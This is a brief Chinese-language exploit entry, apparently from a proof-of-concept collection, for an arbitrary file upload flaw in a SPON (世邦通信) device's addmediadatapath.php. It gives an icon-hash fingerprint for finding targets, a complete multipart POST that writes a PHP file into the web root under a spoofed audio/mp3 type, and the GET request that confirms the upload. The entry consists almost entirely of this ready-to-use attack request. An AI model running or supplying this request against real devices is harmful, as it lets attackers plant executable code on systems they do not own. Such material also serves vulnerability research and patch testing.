# 世邦通信addmediadatapath.php文件上传

- **系统**：世邦通信addmediadatapath.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="-1830859634"`
- **请求**：`POST /php/addmediadatapath.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYrqVrkjR…`　`Content-Length: 395`

**请求体 / payload**
```
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="subpath"
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="fullpath"
C:\ICPAS\Wnmp\WWW\php
------WebKitFormBoundaryYrqVrkjRl2AHEKXG
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: audio/mp3
123456
------WebKitFormBoundaryYrqVrkjRl2AHEKXG--
上传定位：
GET /php/test.php HTTP/1.1
Host:
```
- **预期**：200　|　—